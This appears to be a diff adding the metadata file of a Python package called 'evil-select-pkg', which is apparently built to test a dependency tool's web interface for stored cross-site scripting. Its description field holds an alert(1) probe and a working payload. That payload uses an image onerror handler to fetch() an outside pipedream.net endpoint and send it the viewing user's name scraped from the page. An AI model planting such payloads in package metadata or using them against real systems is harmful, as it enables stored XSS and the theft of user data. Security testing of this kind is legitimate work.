@@ -1,0 +1,19 @@
+Metadata-Version: 2.1
+Name: evil-select-pkg
+Version: 0.0.2
+Summary: An evil package to stress Select out
+Home-page: https://github.com/Splinter0/evil-select-pkg
+Author: Tobia Righi
+Author-email: tobia.righi@debricked.com
+License: UNKNOWN
+Platform: UNKNOWN
+Classifier: Programming Language :: Python :: 3
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Operating System :: OS Independent
+Requires-Python: >=3.6
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+$<img src=a onerror="alert(1)">%$
+$<img src=a onerror="fetch('https://entmc8svqapf25h.m.pipedream.net/'+document.getElementsByClassName('user')[0].innerText.split('\n')[0])">%$
+
